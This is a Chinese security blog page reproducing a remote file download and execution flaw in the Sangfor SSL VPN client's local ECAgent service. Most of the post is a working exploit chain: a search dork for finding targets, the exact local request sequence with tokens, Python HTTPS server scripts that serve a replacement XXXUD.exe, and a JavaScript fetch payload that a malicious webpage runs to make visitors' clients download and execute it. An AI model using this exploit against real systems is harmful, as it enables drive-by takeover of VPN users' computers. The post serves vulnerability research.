<!DOCTYPE html>
<html>
<head>
  <meta charset="utf-8">
  
  <title>She11c0de&#39;s blogs</title>
  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
  <meta name="description" content="深信服 SSL VPN 客户端远程文件下载漏洞描述深信服 SSL VPN 客户端存在远程文件下载，且文件可控下载后可执行 漏洞影响 [!NOTE] 深信服 SSL VPN  漏洞复现百度”intitle: 欢迎使用SSL VPN”，随便找一个地方下载VPN客户端下载安装： ![](&#x2F;resource&#x2F;深信服SSL-VPN-客户端远程文件下载&#x2F;media&#x2F;1.png) 安装完之后访问VPN的页面，发">
<meta property="og:type" content="article">
<meta property="og:title" content="She11c0de&#39;s blogs">
<meta property="og:url" content="https://she11c0de.github.io/2022/07/07/%E6%B7%B1%E4%BF%A1%E6%9C%8D/%E6%B7%B1%E4%BF%A1%E6%9C%8D%20SSL%20VPN%20%E5%AE%A2%E6%88%B7%E7%AB%AF%E8%BF%9C%E7%A8%8B%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD/index.html">
<meta property="og:site_name" content="She11c0de&#39;s blogs">
<meta property="og:description" content="深信服 SSL VPN 客户端远程文件下载漏洞描述深信服 SSL VPN 客户端存在远程文件下载，且文件可控下载后可执行 漏洞影响 [!NOTE] 深信服 SSL VPN  漏洞复现百度”intitle: 欢迎使用SSL VPN”，随便找一个地方下载VPN客户端下载安装： ![](&#x2F;resource&#x2F;深信服SSL-VPN-客户端远程文件下载&#x2F;media&#x2F;1.png) 安装完之后访问VPN的页面，发">
<meta property="og:locale" content="zh_CN">
<meta property="article:published_time" content="2022-07-08T06:26:10.836Z">
<meta property="article:modified_time" content="2022-07-08T09:06:16.857Z">
<meta property="article:author" content="She11c0de">
<meta name="twitter:card" content="summary">
  
  
    <link rel="icon" href="/favicon.png">
  
  <link type="text/css" href="//netdna.bootstrapcdn.com/font-awesome/4.2.0/css/font-awesome.css" rel="stylesheet">
  
<link rel="stylesheet" href="/css/style.css">

  
<link rel="stylesheet" href="/css/scrollUp/image.css">

  <!--[if lt IE 9]><script src="//cdnjs.cloudflare.com/ajax/libs/html5shiv/3.7/html5shiv.min.js"></script><![endif]-->
  
<meta name="generator" content="Hexo 5.4.2"></head>
<body>
  <div id="container">
    <div id="wrap">
      <header id="header">
  <div id="banner"></div>
  <div id="header-outer" class="outer">
    <div id="header-title" class="inner">
      <div class="logo">
        <img src="/logo.png" alt="Profile Picture">
      </div>
      <div id="title">She11c0de's blogs</div>
      
       <ul class="my-socials">
  
 
</ul>
    </div>
  </div>
  <div id="header-inner" class="">
    <nav id="main-nav">
      <a id="main-nav-toggle" class="nav-icon"></a>
      <!--
        
          
            <a class="main-nav-link" href="/">首页</a>
          
            <a class="main-nav-link" href="/categories/life">生活</a>
          
            <a class="main-nav-link" href="/archives">归档</a>
          
        
      -->
    </nav>
    <nav id="title-nav" style="display:none">
      <a href="/">She11c0de&#39;s blogs</a>
      <img src="/logo.png" alt="Profile Picture">
      <!--
      <span id="title-nav-socials">
        
       
     </span>
      -->
    </nav>
    <nav id="sub-nav">
      
      <a id="nav-search-btn" class="nav-icon" title="Search"></a>
    </nav>
    <div id="search-form-wrap">
      <form action="http://www.baidu.com/baidu" method="get" accept-charset="utf-8" class="search-form">
        <input type="search" name="word" maxlength="20" class="search-form-input" placeholder="搜索">
        <input type="submit" value="" class="search-form-submit">
        <input name=tn type=hidden value="bds">
        <input name=cl type=hidden value="3">
        <input name=ct type=hidden value="2097152">
        <input type="hidden" name="si" value="she11c0de.github.io">
      </form>
    </div>
  </div>
  <div class="site-nav" style="display: none;">
    <ul>
      
      
        <li><a href="/">首页</a></li>
      
        <li><a href="/categories/life">生活</a></li>
      
        <li><a href="/archives">归档</a></li>
      
      
    </ul>
  </div>
</header>
      <div class="outer">
        <section id="main"><article id="post-深信服/深信服 SSL VPN 客户端远程文件下载" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2022/07/07/%E6%B7%B1%E4%BF%A1%E6%9C%8D/%E6%B7%B1%E4%BF%A1%E6%9C%8D%20SSL%20VPN%20%E5%AE%A2%E6%88%B7%E7%AB%AF%E8%BF%9C%E7%A8%8B%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD/" class="article-date">
  <time datetime="2022-07-08T06:26:10.836Z" itemprop="datePublished">2022-07-07</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
    <div class="article-entry" itemprop="articleBody">
      
        <h1 id="深信服-SSL-VPN-客户端远程文件下载"><a href="#深信服-SSL-VPN-客户端远程文件下载" class="headerlink" title="深信服 SSL VPN 客户端远程文件下载"></a>深信服 SSL VPN 客户端远程文件下载</h1><h2 id="漏洞描述"><a href="#漏洞描述" class="headerlink" title="漏洞描述"></a>漏洞描述</h2><p>深信服 SSL VPN 客户端存在远程文件下载，且文件可控下载后可执行</p>
<h2 id="漏洞影响"><a href="#漏洞影响" class="headerlink" title="漏洞影响"></a>漏洞影响</h2><blockquote>
<p>[!NOTE]</p>
<p>深信服 SSL VPN</p>
</blockquote>
<h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>百度”intitle: 欢迎使用SSL VPN”，随便找一个地方下载VPN客户端下载安装：</p>
<p>![](/resource/深信服SSL-VPN-客户端远程文件下载/media/1.png)</p>
<p>安装完之后访问VPN的页面，发现VPN会自动下载组件更新：</p>
<p>![](/resource/深信服SSL-VPN-客户端远程文件下载/media/2.png)</p>
<p>这些请求均为GET请求并附带着一些参数，我们把它一一列下来：</p>
<p>![](/resource/深信服SSL-VPN-客户端远程文件下载/media/3.png)</p>
<p>本地来看一下这个<code>54530</code>端口对应的进程是什么：</p>
<p>![](/resource/深信服SSL-VPN-客户端远程文件下载/media/4.png)</p>
<p>发现这个端口是ECAgent.exe开启的，寻找到对应进程文件所在位置：</p>
<p>![](/resource/深信服SSL-VPN-客户端远程文件下载/media/5.png)</p>
<p>确认这是XXX SSLVPN的程序，那么就可以将两者联系到一起，访问VPN登录首页会触发对<code>127.0.0.1</code>的访问从而引起VPN进行组件更新。</p>
<p>通过以上的分析我们猜测了整个大致流程，但我们设想一下如果我们可以控制本地的更新指向我们的服务器，然后将更新的组件内容替换成恶意程序，当程序启动的时候就启动了恶意程序，这样我们可以拿到安装VPN客户端的使用者PC权限。</p>
<p>再回到之前的本地链接列表，根据对英文的理解，参数op的值应该为其具体对应要执行的动作：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">InitECAgent -&gt; 初始化</span><br><span class="line">GetEncryptKey -&gt; 获取加密密钥</span><br><span class="line">DoConfigure -&gt; 配置</span><br><span class="line">CheckReLogin -&gt; 检查重新登录</span><br><span class="line">CheckProxySetting -&gt; 检查代理设置</span><br><span class="line">UpdateControls -&gt; 更新控制</span><br><span class="line">DoQueryService -&gt; 查询服务</span><br></pre></td></tr></table></figure>

<p>第一个初始化的请求存在可控参数arg1：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://127.0.0.1:54530/ECAgent/?op=InitECAgent&amp;arg1=vpn.xxx.edu.cn%20443&amp;callback=EA_cb10000</span><br></pre></td></tr></table></figure>

<p>参数<code>arg1=vpn.xxx.edu.cn%20443</code>，对应值也就是HOST+空格+端口的格式，看到这里基本上就会有一个思路，客户端更新控件是不是根据这个指定值向其发送请求更新的呢？我们可以只替换第一个初始化请求的arg1参数为<code>172.20.10.2 8000</code>，然后本地搭建一个HTTP服务：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -m SimpleHTTPServer</span><br></pre></td></tr></table></figure>

<p>其他的请求原封不动，依次请求一遍那一份URL</p>
<p>服务端成功收到请求，但是却出现了错误的提示：</p>
<p>![](/resource/深信服SSL-VPN-客户端远程文件下载/media/6.png)</p>
<p>首先我们已经验证了自己的猜想，更新地址是自己可控的，客户端确实会向我们指定的服务端发送请求，但由于出现了错误我们不知道客户端访问了哪个文件，也不知道访问文件之后做了什么动作。</p>
<p>现在要做的就是搭建一个客户端可以正常访问的请求，通过这个错误大致可以知道，我搭建的服务端协议和客户端请求使用的协议不一致，本机抓个包发现客户端请求的是 HTTPS 协议，这就需要搭建一个 HTTPS 服务了。</p>
<p>如下脚本基于Python库建立一个 HTTPS 服务：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># openssl req -new -x509 -keyout server.pem -out server.pem -days 365 -nodes</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> BaseHTTPServer, SimpleHTTPServer</span><br><span class="line"><span class="keyword">import</span> ssl</span><br><span class="line"></span><br><span class="line">httpd = BaseHTTPServer.HTTPServer((<span class="string">&#x27;0.0.0.0&#x27;</span>, <span class="number">8000</span>), SimpleHTTPServer.SimpleHTTPRequestHandler)</span><br><span class="line">httpd.socket = ssl.wrap_socket (httpd.socket, certfile=<span class="string">&#x27;./server.pem&#x27;</span>, server_side=<span class="literal">True</span>)</span><br><span class="line">httpd.serve_forever()</span><br></pre></td></tr></table></figure>

<p>搭建起一个 HTTPS 环境后再次复现如上请求，服务端收到日志：</p>
<p>![](/resource/深信服SSL-VPN-客户端远程文件下载/media/7.png)</p>
<p>可以看见客户端会访问两个文件：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">/com/WindowsModule.xml</span><br><span class="line">/com/win/XXXUD.exe</span><br></pre></td></tr></table></figure>

<p>先不管xml文件是怎么样的，可执行文件(exe)是需要重视的，但是这里通过提示可以看出客户端发出的请求是POST请求，但我们所写的Python脚本建立的HTTPS服务并不支持POST方法，我们需要重写一下Handler：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> BaseHTTPServer</span><br><span class="line"><span class="keyword">import</span> SimpleHTTPServer</span><br><span class="line"><span class="keyword">import</span> cgi</span><br><span class="line"><span class="keyword">import</span> ssl</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">ServerHandler</span>(SimpleHTTPServer.SimpleHTTPRequestHandler):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">do_POST</span>(<span class="params">self</span>):</span><br><span class="line">        form = cgi.FieldStorage()</span><br><span class="line">        SimpleHTTPServer.SimpleHTTPRequestHandler.do_GET(self)</span><br><span class="line"></span><br><span class="line">Handler = ServerHandler</span><br><span class="line"></span><br><span class="line">httpd = BaseHTTPServer.HTTPServer((<span class="string">&#x27;0.0.0.0&#x27;</span>, <span class="number">8000</span>), Handler)</span><br><span class="line">httpd.socket = ssl.wrap_socket (httpd.socket, certfile=<span class="string">&#x27;./server.pem&#x27;</span>, server_side=<span class="literal">True</span>)</span><br><span class="line">httpd.serve_forever()</span><br></pre></td></tr></table></figure>

<p>最终如上脚本支持<code>POST</code>方法，当时用<code>POST</code>方法请求时即返回文件内容。</p>
<p>最后，拖一个<code>calc.exe</code>（计算器）到HTTPS网站根目录下的<code>/com/win/XXXUD.exe</code>。</p>
<p>依次请求（<strong>经过多次复现发现，这三个请求才是重点的，其他的可以忽略</strong>）：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">https://127.0.0.1:54530/ECAgent/?op=InitECAgent&amp;arg1=172.20.10.2 8000&amp;callback=EA_cb10000</span><br><span class="line"></span><br><span class="line">https://127.0.0.1:54530/ECAgent/?op=CheckReLogin&amp;arg1=3408a894633162c62188f98e92a221967dccfa5aafbd79b576714b4d1c392a4ad4b220d698efcd939c3b1b37467023e9380ee3abf0e492ee2efc736de757b80e973fe4c7d8af1af211a3f7ff3433cd9de975c76583efe7251dd1c0656f4384832998630359b65beb131cd8d287712462fa1b9e9acbc96dcc678b84cd57178c1a&amp;token=50065256e83ff1bb9e01757d0d22b669&amp;callback=EA_cb10003</span><br><span class="line"></span><br><span class="line">https://127.0.0.1:54530/ECAgent/?op=UpdateControls&amp;arg1=BEFORELOGIN&amp;callback=EA_cb10005</span><br></pre></td></tr></table></figure>

<p>会发现客户端请求之后，将文件下载到本地并启动该程序，成功弹出计算器：</p>
<p>![](/resource/深信服SSL-VPN-客户端远程文件下载/media/8.png)</p>
<p>Exploit很简单，当用户打开某个页面时访问那三个本地请求即可，这里使用JavaScript的fetch去实现即可：</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line">    <span class="comment">// 服务器IP和端口</span></span><br><span class="line">    <span class="keyword">var</span> ip = <span class="string">&quot;172.20.10.2&quot;</span>;</span><br><span class="line">    <span class="keyword">var</span> port = <span class="string">&quot;4443&quot;</span>;</span><br><span class="line">    <span class="keyword">var</span> poc_list = [<span class="string">&quot;https://127.0.0.1:54530/ECAgent/?op=InitECAgent&amp;arg1=&quot;</span> + ip + <span class="string">&quot; &quot;</span> + port + <span class="string">&quot;&amp;Guid=&amp;callback=EA_cb10000&quot;</span>, <span class="string">&quot;https://127.0.0.1:54530/ECAgent/?op=CheckReLogin&amp;arg1=3616f5b2ad1fe9b62b3d34509daa11259782919108eb2bebe59d64c808c3a079c6f6ae36b6ff1d63cb8067d08a9db72b70d912bfdb8bdc6ca18140cfa0ffb9e88b85acebf4bf544f71ff0fc662b9b95a8e939928b847018c106e1a96686e1ec3274a89ae0b8f77fc3d53a5ce0f1eec9a0ce8a5e4e2c927331cd94a67d5360a3e&amp;token=c4202416e283e60809d3b1e04e4bae6b&amp;Guid=&amp;callback=EA_cb10003&quot;</span>, <span class="string">&quot;https://127.0.0.1:54530/ECAgent/?op=UpdateControls&amp;arg1=BEFORELOGIN&amp;Guid=&amp;callback=EA_cb10005&quot;</span>];</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">var</span> i=<span class="number">0</span>; i&lt;poc_list.<span class="property">length</span>; i++)&#123;</span><br><span class="line">        <span class="built_in">setTimeout</span>(<span class="title function_">fetch</span>(poc_list[i]),<span class="string">&quot;2000&quot;</span>);</span><br><span class="line">        </span><br><span class="line">    &#125;</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure>

<p>其次就是需要一个HTTPS服务端的Python脚本，并且在脚本根目录下的<code>/com/win/</code>目录下有一个<code>XXXUD.exe</code>文件。</p>
<p>![](/resource/深信服SSL-VPN-客户端远程文件下载/media/9.png)</p>
<h2 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h2><p><a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s/XbsxziIFKx8VhGd-pv0Ghg">https://mp.weixin.qq.com/s/XbsxziIFKx8VhGd-pv0Ghg</a></p>

      
    </div>
    <footer class="article-footer">
      
        <a data-url="https://she11c0de.github.io/2022/07/07/%E6%B7%B1%E4%BF%A1%E6%9C%8D/%E6%B7%B1%E4%BF%A1%E6%9C%8D%20SSL%20VPN%20%E5%AE%A2%E6%88%B7%E7%AB%AF%E8%BF%9C%E7%A8%8B%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD/" data-id="cl5c2r0z700qby8v14sgd6f0q" class="article-share-link">分享到</a>
      

      
    </footer>
  </div>
  
    
<nav id="article-nav">
  
    <a href="/2022/07/07/%E6%B7%B1%E4%BF%A1%E6%9C%8D/%E6%B7%B1%E4%BF%A1%E6%9C%8D%20SSL%20VPN%20%E8%A7%A3%E5%AF%86/" id="article-nav-newer" class="article-nav-link-wrap">
      <strong class="article-nav-caption">Newer</strong>
      <div class="article-nav-title">
        
          (no title)
        
      </div>
    </a>
  
  
    <a href="/2022/07/07/%E6%B7%B1%E4%BF%A1%E6%9C%8D/%E6%B7%B1%E4%BF%A1%E6%9C%8D%20SSL%20VPN%20%E4%BD%8E%E7%89%88%E6%9C%ACGetshell/" id="article-nav-older" class="article-nav-link-wrap">
      <strong class="article-nav-caption">Older</strong>
      <div class="article-nav-title"></div>
    </a>
  
</nav>

  
</article>

</section>
        
      </div>
      <footer id="footer">
  
  <div class="outer">
    <div id="footer-info" class="inner">
      &copy; 2022 She11c0de<br>
      Theme <a href="https://github.com/henryhuang/oishi" target="_blank">Oishi</a>, Powered by <a href="http://hexo.io/" target="_blank">Hexo</a>
    </div>
  </div>
</footer>
    </div>
    <!--
      <nav id="mobile-nav">
  
    <a href="/" class="mobile-nav-link">首页</a>
  
    <a href="/categories/life" class="mobile-nav-link">生活</a>
  
    <a href="/archives" class="mobile-nav-link">归档</a>
  
</nav>
    -->
    

<!-- 百度分享 start -->

<!-- 百度分享 end -->

<script src="//cdn.bootcss.com/jquery/1.11.1/jquery.min.js"></script>




<script src="/js/jquery.scrollUp.min.js"></script>


<script src="/js/jquery.transform.js"></script>


<script src="/js/menu.js"></script>



<script src="/js/script.js"></script>


<script src="/js/scrollUp.js"></script>


  </div>
</body>
</html>